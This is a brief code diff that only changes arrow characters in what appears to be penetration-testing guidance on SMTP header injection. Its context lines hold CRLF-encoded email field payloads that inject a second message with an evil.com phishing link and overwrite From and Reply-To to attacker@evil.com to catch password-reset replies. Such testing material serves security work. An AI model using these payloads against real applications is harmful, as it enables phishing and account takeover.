@@ -23,13 +23,13 @@ If the app passes user input directly to SMTP without sanitization:
 ```
 email: test@test.com%0d%0aDATA%0d%0aFrom:admin@target.com%0d%0aSubject:URGENT%0d%0aClick http://evil.com%0d%0a.%0d%0a
 ```
-→ Injects a second email into the SMTP session.
+-> Injects a second email into the SMTP session.
 
 #### STEP 4: HEADER OVERWRITE
 ```
 email: test@test.com%0d%0aFrom:ceo@target.com%0d%0aReply-To:attacker@evil.com
 ```
-→ Phish replies to password reset emails.
+-> Phish replies to password reset emails.
 
 #### ANTI-PATTERNS: Test ALL fields that end up in the email: name, email, subject, message body, cc, reply-to fields.
 """
